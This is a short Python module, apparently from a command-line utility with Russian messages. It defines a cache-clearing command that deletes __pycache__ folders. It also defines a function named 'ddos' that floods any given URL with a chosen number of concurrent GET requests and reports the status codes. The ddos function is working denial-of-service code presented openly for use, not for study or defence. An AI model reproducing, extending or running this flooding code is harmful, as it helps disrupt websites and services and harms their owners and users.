from colorama import Fore
from bin.core import start
import time, shutil, os, requests, concurrent.futures

def commands():
    return { 
        'clearcache': clearcache
    }

def clearcache(root_dir="."):
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for dirname in dirnames:
            if dirname == "__pycache__":
                pycache_path = os.path.join(dirpath, dirname)
                shutil.rmtree(pycache_path)
                print(f"Удалена папка: {pycache_path}")
    print(Fore.GREEN + 'Cache cleared!' + Fore.RESET)
    time.sleep(1)
    return start()

def ddos(url,amount):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(requests.get, url) for _ in range(amount)]
        for future in concurrent.futures.as_completed(futures):
            print(Fore.BLUE + f"Ответ от {url}: {future.result().status_code}" + Fore.RESET)
    print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
    time.sleep(2)
    return start()